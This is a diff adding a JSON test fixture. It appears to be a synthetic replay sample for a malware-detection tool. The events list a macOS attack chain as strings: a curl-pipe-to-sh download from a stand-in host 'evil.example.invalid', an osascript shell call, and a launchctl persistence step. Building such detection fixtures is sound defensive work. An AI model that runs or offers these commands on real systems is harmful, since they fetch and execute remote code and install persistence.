@@ -1,0 +1,10 @@
+{
+  "sample_id": "replay_malicious_chain_01",
+  "replay_only": true,
+  "events": [
+    {"ts": "2026-03-01T10:20:00Z", "event": "string_artifact", "value": "curl https://evil.example.invalid/dropper | sh"},
+    {"ts": "2026-03-01T10:20:01Z", "event": "string_artifact", "value": "osascript -e 'do shell script ...'"},
+    {"ts": "2026-03-01T10:20:02Z", "event": "string_artifact", "value": "launchctl bootstrap gui/501 ..."},
+    {"ts": "2026-03-01T10:20:03Z", "event": "note", "message": "Synthetic malicious replay. No executable payload included."}
+  ]
+}
